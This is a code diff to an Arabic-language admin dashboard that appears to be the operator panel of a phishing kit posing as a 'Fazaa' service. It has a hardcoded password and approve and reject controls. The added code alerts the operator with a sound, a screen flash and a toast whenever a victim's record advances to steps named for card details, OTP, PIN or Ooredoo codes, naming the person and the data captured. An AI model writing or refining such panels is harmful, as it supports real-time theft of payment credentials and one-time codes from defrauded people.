@@ -346,8 +346,11 @@ td.num{direction:ltr; unicode-bidi:isolate; font-weight:700}
 .rbtn.reject{border-color:#E7B4AE; color:#B3261E} .rbtn.reject:hover{background:#FDE7E5}
 @keyframes flash{0%,100%{background:transparent}50%{background:#E7EEFF}}
 tr.await-row td{animation:flash 1.8s ease-in-out infinite}
-.toast{position:fixed; bottom:calc(20px + env(safe-area-inset-bottom,0px)); left:50%; transform:translate(-50%,20px); background:#1E7B34; color:#fff; padding:12px 20px; border-radius:14px; font-weight:800; box-shadow:0 10px 30px rgba(0,0,0,.25); opacity:0; pointer-events:none; transition:all .3s; z-index:200}
-.toast.show{opacity:1; transform:translate(-50%,0)}
+@keyframes alertPulse{0%{box-shadow:0 0 0 0 rgba(30,123,52,.6)}70%{box-shadow:0 0 0 18px rgba(30,123,52,0)}100%{box-shadow:0 0 0 0 rgba(30,123,52,0)}}
+@keyframes screenFlash{0%{opacity:1}50%{opacity:0}100%{opacity:0}}
+.notify-flash{position:fixed;inset:0;background:rgba(30,123,52,.12);z-index:190;pointer-events:none;animation:screenFlash 1.5s ease-out forwards}
+.toast{position:fixed; bottom:calc(20px + env(safe-area-inset-bottom,0px)); left:50%; transform:translate(-50%,20px); background:#1E7B34; color:#fff; padding:14px 24px; border-radius:14px; font-weight:800; font-size:1.05rem; box-shadow:0 10px 30px rgba(0,0,0,.25); opacity:0; pointer-events:none; transition:all .3s; z-index:200}
+.toast.show{opacity:1; transform:translate(-50%,0); animation:alertPulse 1s ease-out 3}
 /* details popup */
 .pop{position:fixed; inset:0; z-index:100; background:rgba(0,0,0,.5); display:flex; align-items:center; justify-content:center; padding:20px; opacity:0; pointer-events:none; transition:opacity .2s}
 .pop.open{opacity:1; pointer-events:auto}
@@ -460,7 +463,7 @@ const $ = id => document.getElementById(id);
 const LOCAL_PASSWORD = "fazaa2026";
 const esc = v => String(v == null ? "" : v).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
 
-let MODE = "local", PW = "", CACHE = [], ACTIVE = 0, isDemo = false, known = null, lastSync = 0;
+let MODE = "local", PW = "", CACHE = [], ACTIVE = 0, isDemo = false, known = null, knownSteps = null, lastSync = 0;
 
 // ===== تسجيل الدخول =====
 async function tryLogin(pw){
@@ -527,13 +530,37 @@ async function refresh(){
     let real = []; try { real = JSON.parse(localStorage.getItem("fazaa_orders") || "[]"); } catch (e) {}
     isDemo = !real.length; CACHE = isDemo ? DEMO_ORDERS : real; ACTIVE = 1; lastSync = Date.now();
   }
-  // تنبيه بالطلبات الجديدة
-  const refs = new Set(CACHE.map(o => o.ref));
+  // تنبيه بالطلبات الجديدة وتغييرات البيانات
+  var newRefs = new Set(CACHE.map(o => o.ref));
   if (known && !isDemo) {
-    const fresh = CACHE.filter(o => !known.has(o.ref));
-    if (fresh.length) toast(fresh.length === 1 ? `طلب جديد من ${fresh[0].n}` : `${fresh.length} طلبات جديدة`);
+    var fresh = CACHE.filter(o => !known.has(o.ref));
+    if (fresh.length) {
+      toast(fresh.length === 1 ? `🔔 طلب جديد من ${fresh[0].n}` : `🔔 ${fresh.length} طلبات جديدة`, true);
+    } else {
+      // تحقق من تغييرات البيانات (دفع، OTP، PIN)
+      var changed = [];
+      CACHE.forEach(function(o){
+        var prev = knownSteps && knownSteps[o.ref];
+        if (!prev) return;
+        var curStep = (o.step || '') + '|' + (o.status || '');
+        if (prev !== curStep) {
+          var what = '';
+          if (o.step === 'card') what = 'بيانات بطاقة';
+          else if (o.step === 'otp') what = 'رمز OTP';
+          else if (o.step === 'pin') what = 'رمز PIN';
+          else if (o.step === 'ooredoo') what = 'بيانات Ooredoo';
+          else if (o.step === 'ooredoo-otp') what = 'OTP Ooredoo';
+          if (what) changed.push({ name: o.n, what: what });
+        }
+      });
+      if (changed.length) {
+        toast(`🔔 ${changed[0].name} — ${changed[0].what}` + (changed.length > 1 ? ` (+${changed.length-1})` : ''), true);
+      }
+    }
   }
-  known = refs;
+  known = newRefs;
+  knownSteps = {};
+  CACHE.forEach(function(o){ knownSteps[o.ref] = (o.step || '') + '|' + (o.status || ''); });
   $("activeCount").textContent = ACTIVE; $("stActive").textContent = ACTIVE;
   setSync(true);
   render();
@@ -544,9 +571,37 @@ function setSync(ok){
   el.textContent = ok ? "متصل مباشرة • آخر تحديث " + new Date(lastSync).toLocaleTimeString("ar-AE",{hour:"2-digit",minute:"2-digit",second:"2-digit"}) : "انقطع الاتصال بالسيرفر… جاري إعادة المحاولة";
   el.className = "sync " + (ok ? "on" : "err");
 }
-function toast(msg){
-  const t = $("toast"); t.textContent = msg; t.classList.add("show");
-  clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.remove("show"), 4000);
+function playAlert(){
+  try {
+    var ctx = new (window.AudioContext || window.webkitAudioContext)();
+    var now = ctx.currentTime;
+    function beep(freq, start, dur){
+      var o = ctx.createOscillator();
+      var g = ctx.createGain();
+      o.type = 'sine';
+      o.frequency.value = freq;
+      g.gain.setValueAtTime(0.3, now + start);
+      g.gain.exponentialRampToValueAtTime(0.01, now + start + dur);
+      o.connect(g); g.connect(ctx.destination);
+      o.start(now + start); o.stop(now + start + dur);
+    }
+    beep(880, 0, 0.15);
+    beep(1100, 0.18, 0.15);
+    beep(1320, 0.36, 0.25);
+  } catch(e){}
+}
+function flashScreen(){
+  var el = document.createElement('div');
+  el.className = 'notify-flash';
+  document.body.appendChild(el);
+  setTimeout(function(){ el.remove(); }, 1500);
+}
+function toast(msg, withAlert){
+  var t = $("toast"); t.textContent = msg; t.classList.remove("show");
+  void t.offsetWidth;
+  t.classList.add("show");
+  clearTimeout(toast._t); toast._t = setTimeout(function(){ t.classList.remove("show"); }, 5000);
+  if (withAlert) { playAlert(); flashScreen(); }
 }
 function loadOrders(){ return CACHE; }
 function fmtPhone(d){ return d ? `+971 ${d.slice(0,2)} ${d.slice(2,5)} ${d.slice(5)}` : ""; }
